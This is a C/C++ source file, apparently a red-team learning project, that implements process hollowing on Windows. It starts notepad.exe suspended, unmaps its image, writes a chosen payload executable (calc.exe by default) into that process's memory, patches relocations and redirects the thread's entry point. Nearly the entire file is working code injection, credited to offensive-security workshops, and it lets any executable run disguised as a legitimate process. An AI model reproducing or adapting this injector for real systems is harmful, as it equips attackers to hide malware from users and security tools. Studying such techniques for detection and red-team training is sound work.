// when you want to run this in VS Studio. You should select the platform (Architecture x64, x86) the same as the payload file you built.


//						Credit
// https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations
// https://github.com/adamhlt/Process-Hollowing.git
// https://github.com/RedTeamOperations/Advanced-Process-Injection-Workshop.git
//


//#define WIN32_LEAN_AND_MEAN  
#include <windows.h>                  
#include <stdio.h>         
#include <cstdlib>          
#include "WinNtAPI.h"        

//this macro use for checks whether the code is being compiled for a 64-bit (x64) or 32-bit (x86) Windows system.
#ifdef _WIN64
#define IS_64BIT TRUE
#else
#define IS_64BIT FALSE
#endif

#define IS_VALID_HANDLE(h) ((h) != NULL && (h) != INVALID_HANDLE_VALUE) //check the handle is not NULL and INVALID_HANDLE_VALUE.
#define HANDLES_VALID(pi) (IS_VALID_HANDLE((pi).hProcess) && IS_VALID_HANDLE((pi).hThread)) //check both hProcess and hThread are valid.

//tg --> target 
//pl --> payload

typedef union {
	PIMAGE_NT_HEADERS64 nt64;
	PIMAGE_NT_HEADERS32 nt32;
} NT_HEADERS_UNION;

typedef union {
	ULONGLONG pe64;
	ULONGLONG pe32;
}DELTA_BASE;

//Check a hProcess is 64 bit or not??
bool Is64bit(HANDLE hProcess) {
	BOOL isWow64 = FALSE;
	if (!IsWow64Process(hProcess, &isWow64)) {
		return false;
	}
	return !isWow64;
}

//Close Handle.
inline void SafeCloseHandle(HANDLE* handle) {
	if (handle) {
		HANDLE h = *handle;
		if (h && h != INVALID_HANDLE_VALUE) {
			CloseHandle(h);
			*handle = NULL;
		}
	}
}

//Check if the PE image is 64-bit.
BOOL IsPE64Bit(LPVOID ipBuffer) {
	DWORD bytes = 0;

	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)ipBuffer;
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("[-] Invalid DOS signature.\n");
		return FALSE;
	}

	IMAGE_NT_HEADERS64* ntHeader = (IMAGE_NT_HEADERS64*)((BYTE*)ipBuffer + dosHeader->e_lfanew);
	if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
		printf("[-] Invalid NT signature.\n");
		return FALSE;
	}
	return (ntHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC);
}

//It will remove the PE image that is mapped in the target process address space from memory.
void UnmapPE(HANDLE hProcess, PVOID imageBaseAddress) {
	// Get the address of ZwUnmapViewOfSection from ntdll.dll
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) {
		printf("[-] Failed to get handle to ntdll.dll\n");
		return;
	}

	N_NtUnmapViewOfSection mZwUnmapViewOfSection = (N_NtUnmapViewOfSection)GetProcAddress(hNtdll, "ZwUnmapViewOfSection");

	if (mZwUnmapViewOfSection == NULL) {
		printf("Error: ZwUnmapViewOfSection not found\n");
		return;
	}
	NTSTATUS status = mZwUnmapViewOfSection(hProcess, imageBaseAddress);
	if (status == 0) {
		printf("[+] Successfully unmapped the view of the section\n");
	}
	else {
		printf("[-] Failed to unmap the view of the section, Status: 0x%08X\n", status);
	}
}

//Copy all sections of a Portable Executable (PE) file.
void CopyAllSections(HANDLE tgProc, LPVOID TargetImageBase, LPCVOID payloadHeaderFile, PVOID PEHeader, BOOL isPayload64bit)
{
	if (tgProc == NULL || TargetImageBase == NULL || payloadHeaderFile == NULL || PEHeader == NULL) {
		printf("[-] Invalid parameters to CopyAllSections\n");
		return;
	}
	printf("[+] payloadHeaderFile Address: 0x%p\n", payloadHeaderFile);

	PIMAGE_SECTION_HEADER sectionHeader = nullptr;
	WORD numberOfSections = 0;

	if (isPayload64bit) {
		PIMAGE_NT_HEADERS64 nt64 = (PIMAGE_NT_HEADERS64)PEHeader;
		sectionHeader = IMAGE_FIRST_SECTION(nt64);
		numberOfSections = nt64->FileHeader.NumberOfSections;
	}
	else {
		PIMAGE_NT_HEADERS32 nt32 = (PIMAGE_NT_HEADERS32)PEHeader;
		sectionHeader = IMAGE_FIRST_SECTION(nt32);
		numberOfSections = nt32->FileHeader.NumberOfSections;
	}

	printf("[INFO] Number of sections: %d\n", numberOfSections);

	for (WORD i = 0; i < numberOfSections; i++) {
		if (sectionHeader[i].SizeOfRawData == 0) {
			printf("[+] Skipping empty section %d '%s'\n", i, sectionHeader[i].Name);
			continue;
		}

		LPVOID targetAddr = (BYTE*)TargetImageBase + sectionHeader[i].VirtualAddress;
		LPCVOID sourceAddr = (BYTE*)payloadHeaderFile + sectionHeader[i].PointerToRawData;

		printf("[+] Copying section %d '%s'\n", i, sectionHeader[i].Name);
		printf("    Source: 0x%p (File offset: 0x%X)\n", sourceAddr, sectionHeader[i].PointerToRawData);
		printf("    Target: 0x%p (RVA: 0x%X)\n", targetAddr, sectionHeader[i].VirtualAddress);
		printf("    Size: 0x%X bytes\n", sectionHeader[i].SizeOfRawData);

		if (WriteProcessMemory(tgProc, targetAddr, sourceAddr, sectionHeader[i].SizeOfRawData, NULL)) {
			printf("[+] Successfully copied section %d '%s'\n", i, sectionHeader[i].Name);
		}
		else {
			printf("[-] Failed to copy section %d '%s' (Error: %d)\n",
				i, sectionHeader[i].Name, GetLastError());
		}
	}
}

// Adjusts absolute addresses in the injected PE image based on its new base.
void PatchRelocateAddress(HANDLE tgProc, LPVOID newTargetImageBase, PIMAGE_NT_HEADERS ntHeader, ULONGLONG deltaBase, BOOL is64bit)
{
	PIMAGE_SECTION_HEADER peSection = IMAGE_FIRST_SECTION(ntHeader);
	const DWORD relocRVA = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	const DWORD relocSize = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++, peSection++) {
		DWORD sectionVA = peSection->VirtualAddress;
		DWORD sectionSize = peSection->Misc.VirtualSize;
		if (relocRVA >= sectionVA && relocRVA < sectionVA + sectionSize) {
			DWORD relocOffset = relocRVA - sectionVA + peSection->PointerToRawData;
			DWORD parsedSize = 0;

			while (parsedSize < relocSize) {
				PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)((BYTE*)newTargetImageBase + relocOffset + parsedSize);
				if (block->SizeOfBlock == 0)
					break;
				DWORD numEntries = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
				WORD* entryList = (WORD*)(block + 1);

				for (DWORD j = 0; j < numEntries; j++) {
					WORD relocation = entryList[j];
					DWORD type = relocation >> 12;
					DWORD offset = relocation & 0x0FFF;
					if (type == IMAGE_REL_BASED_ABSOLUTE)
						continue;

					DWORD targetRVA = block->VirtualAddress + offset;
					LPVOID remoteAddr = (LPBYTE)newTargetImageBase + targetRVA;

					if (type == IMAGE_REL_BASED_DIR64 && is64bit) {
						ULONGLONG value = 0;
						if (ReadProcessMemory(tgProc, remoteAddr, &value, sizeof(value), NULL)) {
							value += deltaBase;
							WriteProcessMemory(tgProc, remoteAddr, &value, sizeof(value), NULL);
							printf("[64bit] Patched RVA: 0x%08X => 0x%p\n", targetRVA, (void*)value);
						}
					}
					else if (type == IMAGE_REL_BASED_HIGHLOW && !is64bit) {
						DWORD value = 0;
						if (ReadProcessMemory(tgProc, remoteAddr, &value, sizeof(value), NULL)) {
							value += (DWORD)deltaBase;
							WriteProcessMemory(tgProc, remoteAddr, &value, sizeof(value), NULL);
							printf("[32bit] Patched RVA: 0x%08X => 0x%08X\n", targetRVA, value);
						}
					}
				}
				parsedSize += block->SizeOfBlock;
			}
			break;
		}
	}
}

int main()
{
	//Load moudle ntdll.dll
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) {
		printf("[-] Failed to get handle to ntdll.dll\n");
		return -1;
	}

	N_NtQueryInformationProcess mNtQueryInformationProcess = (N_NtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
	if (mNtQueryInformationProcess == NULL) {
		printf("[-] Error NtQueryInformationProcess not found\n");
		return -1;
	}

	//you can change both of it!!
	//Target PE
	char tgPath[34] = "c:\\windows\\syswow64\\notepad.exe";

	//Payload PE
	char plPath[31] = "c:\\windows\\syswow64\\calc.exe";


	//Set up target process
	LPSTR targetPath = tgPath;

	STARTUPINFOA startInfo = { 0 };
	PROCESS_INFORMATION processInfo = { 0 };
	startInfo.cb = sizeof(startInfo);
	//Create a target process using the SUSPENDED state.
	if (!CreateProcessA(NULL, targetPath, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &startInfo, &processInfo)) {
		printf("[-] Error Creating Process");
		SafeCloseHandle(&processInfo.hThread);
		SafeCloseHandle(&processInfo.hProcess);
		return -1;
	};
	if (!HANDLES_VALID(processInfo)) {
		printf("[-] Invalid handles\n");
		SafeCloseHandle(&processInfo.hThread);
		SafeCloseHandle(&processInfo.hProcess);
		return -1;
	}

	printf("[+] Creating Process Success.\n");

	//Get handle of the notepad process that we created.
	HANDLE hTargetProc = processInfo.hProcess;
	BOOL isTarget64Bit = Is64bit(hTargetProc);
	if (IS_64BIT != isTarget64Bit) {
		printf("[-] Architecture mismatch between injector and target process\n");
		TerminateProcess(processInfo.hProcess, 1);
		SafeCloseHandle(&processInfo.hThread);
		SafeCloseHandle(&processInfo.hProcess);
		return -1;
	}

	/*
	*
	* Structure of a 64 bit PEB.
	typedef struct _PEB64 {
	  BYTE Reserved1[2];
	  BYTE BeingDebugged;
	  BYTE Reserved2[1];
	  PVOID Reserved3[2];
	  PVOID Reserved4[2];
	  PVOID ImageBaseAddress;  // Offset 0x10
	  ...
	} PEB64, *PPEB64;

	Structure of a 32 bit PEB.
	typedef struct _PEB {
	BYTE Reserved1[2];
	BYTE BeingDebugged;
	BYTE Reserved2[1];
	PVOID Reserved3[2];
	PVOID ImageBaseAddress;  // Offset 0x8
	...
	} PEB, *PPEB;
	*/

	SIZE_T  imageBaseOffset = 0;
	if (isTarget64Bit) {
		imageBaseOffset = 0x10;
		printf("[INFO] Target process is 64 bit.\n");
	}
	else {
		imageBaseOffset = 0x08;
		printf("[INFO] Target process is 32 bit.\n");
	}

	PROCESS_BASIC_INFORMATION procInfoClass = { 0 };
	ULONG retLen = 0;

	//It retrieves information from Process Basic Information, which contains details about the PEB (Process Environment Block) of the process.
	mNtQueryInformationProcess(hTargetProc, ProcessBasicInformation, &procInfoClass, sizeof(PROCESS_BASIC_INFORMATION), &retLen);
	PVOID pebBase = procInfoClass.PebBaseAddress; //store the address of PEB
	LPCVOID pebImageBaseOffset = (LPCVOID)((PBYTE)pebBase + imageBaseOffset);
	PVOID pTargetImageBase = NULL;

	// Getting Target ImageBase Addresss.
	if (pebImageBaseOffset == 0) {
		printf("[-] Failed to find image base offset.\n");
		return -1;
	}
	//Read data in PEB from the memory of the target process cuz i need the target image base.
	SIZE_T byte = 0;
	if (!ReadProcessMemory(hTargetProc, pebImageBaseOffset, &pTargetImageBase, sizeof(PVOID), &byte)) {
		printf("[-] Failed to read target image Base Addresss\n");
		return -1;
	}
	printf("[+] The target image base address is %p.\n", pTargetImageBase);

	//Set up payload.
	LPCSTR payloadPath = plPath;

	//Check if the file exists.
	DWORD attrs = GetFileAttributesA(plPath);
	if (attrs == INVALID_FILE_ATTRIBUTES && GetLastError() == ERROR_FILE_NOT_FOUND) {
		printf("[-] File not found.\n");
		return -1;
	}

	// Open the payload file to read its contents.
	HANDLE hplFile = CreateFileA(plPath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (hplFile == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to read content from the payload file\n");
		return -1;
	}

	//Get payload size.
	DWORD dplFileSize = GetFileSize(hplFile, NULL);
	printf("[INFO] The payload file size: %lu bytes\n", dplFileSize);

	// Allocate Space in memory 
	LPVOID pPayloadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dplFileSize);
	if (pPayloadBuffer == NULL) {
		printf("[-] Failed to allocate space in memory.\n");
		SafeCloseHandle(&hplFile);
		HeapFree(GetProcessHeap(), 0, pPayloadBuffer);
		return -1;
	}
	printf("[+] Allocate at : 0x%p\n", pPayloadBuffer);

	DWORD  bytesRead = 0;
	if (!ReadFile(hplFile, pPayloadBuffer, dplFileSize, &bytesRead, NULL)) {
		printf("[-] Failed to read data from the payload file.\n");
	}

	BOOL isPayload64bit = IsPE64Bit(pPayloadBuffer);
	if (isPayload64bit != isTarget64Bit) {
		printf("[-] Error : Payload and Target PE aren't compatible");
		return -1;
	}
	SafeCloseHandle(&hplFile);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pPayloadBuffer;
	PIMAGE_NT_HEADERS payloadNTHeadersCommon = (PIMAGE_NT_HEADERS)((ULONG_PTR)pPayloadBuffer + dosHeader->e_lfanew);
	SIZE_T imageSize = 0;
	NT_HEADERS_UNION payloadNTHeader = {};
	if (isPayload64bit) {
		// 64-bit PE
		payloadNTHeader.nt64 = (PIMAGE_NT_HEADERS64)payloadNTHeadersCommon;
		imageSize = payloadNTHeader.nt64->OptionalHeader.SizeOfImage;
		printf("[+] The payload image base address is 0x%llX.\n", payloadNTHeader.nt64->OptionalHeader.ImageBase);
	}
	else {
		// 32-bit PE
		payloadNTHeader.nt32 = (PIMAGE_NT_HEADERS32)payloadNTHeadersCommon;
		imageSize = payloadNTHeader.nt32->OptionalHeader.SizeOfImage;
		printf("[+] The payload image base address is 0x%08X.\n", payloadNTHeader.nt32->OptionalHeader.ImageBase);
	}

	//It will remove the PE image that is mapped in the target process address space from memory.
	UnmapPE(hTargetProc, pTargetImageBase);

	// Allocate new memory space in the target process.
	LPVOID pNewTargetImageBase = VirtualAllocEx(hTargetProc, pTargetImageBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pNewTargetImageBase == NULL) {
		printf("[-] Failed to allocate memory the new image base address.");
	}
	printf("[+] New image base of the target process : %p \n", pNewTargetImageBase);

	// Copy the payload's PE headers from local(injector) memory to the target process's allocated memory.
	WriteProcessMemory(hTargetProc, pTargetImageBase, pPayloadBuffer, payloadNTHeadersCommon->OptionalHeader.SizeOfHeaders, NULL);

	PIMAGE_NT_HEADERS peHeader = {};
	DELTA_BASE deltaBase = {};

	if (isTarget64Bit) {
		CopyAllSections(hTargetProc, pNewTargetImageBase, pPayloadBuffer, payloadNTHeader.nt64, true);
		payloadNTHeader.nt64 = (PIMAGE_NT_HEADERS64)payloadNTHeadersCommon;
		deltaBase.pe64 = (ULONGLONG)pNewTargetImageBase - payloadNTHeader.nt64->OptionalHeader.ImageBase;
		peHeader = (PIMAGE_NT_HEADERS)payloadNTHeader.nt64;
		PatchRelocateAddress(hTargetProc, pPayloadBuffer, peHeader, deltaBase.pe64, true);
	}
	else {
		CopyAllSections(hTargetProc, pNewTargetImageBase, pPayloadBuffer, payloadNTHeader.nt32, false);
		payloadNTHeader.nt32 = (PIMAGE_NT_HEADERS32)payloadNTHeadersCommon;
		deltaBase.pe32 = (ULONGLONG)pTargetImageBase - payloadNTHeader.nt32->OptionalHeader.ImageBase;
		peHeader = (PIMAGE_NT_HEADERS)payloadNTHeader.nt32;
		PatchRelocateAddress(hTargetProc, pPayloadBuffer, peHeader, deltaBase.pe32, false);
	}

	//Set up context structure.
	CONTEXT ctx = { 0 };
	//Request to retrieve only control registers (EIP/RIP, ESP/RSP, EBP/RBP)
	ctx.ContextFlags = CONTEXT_CONTROL;

	//To retrieve the current state of a thread (CPU register)
	if (!GetThreadContext(processInfo.hThread, &ctx)) {
		printf("[-] Failed to get thread context. Error: %lu\n", GetLastError());
		TerminateProcess(processInfo.hProcess, 1);
		return -1;
	}
	//Calculate the new entry point of the payload in the target process
	ULONG_PTR newEntryPoint = (ULONG_PTR)pNewTargetImageBase + peHeader->OptionalHeader.AddressOfEntryPoint;

	//Checks at compile-time whether the code is being compiled on a 64-bit system.
#if defined(_WIN64)
		//x64 uses Rip 
	ctx.Rip = newEntryPoint;
#else
		//x86 uses Eax
	ctx.Eip = newEntryPoint;
#endif

	//Set the thread's context to start at the new entry point.
	if (!SetThreadContext(processInfo.hThread, &ctx)) {
		printf("[-] Failed to set thread context. Error: %lu\n", GetLastError());
		TerminateProcess(processInfo.hProcess, 1);
		return -1;
	}

	//Resume a suspended thread.
	ResumeThread(processInfo.hThread);
	printf("[+] Process resumed at new entry point: 0x%p\n", (void*)newEntryPoint);

	//I don't want to terminate a target process so fast.
	// So, i watn to wait for the thread to finish before continuing.
	WaitForSingleObject(processInfo.hThread, INFINITE);
	printf("[+] Target thread has finished execution.\n");

	//terminate, clear and close handle.
	TerminateProcess(processInfo.hProcess, 0);
	HeapFree(GetProcessHeap(), 0, pPayloadBuffer);
	SafeCloseHandle(&processInfo.hThread);
	SafeCloseHandle(&processInfo.hProcess);
}
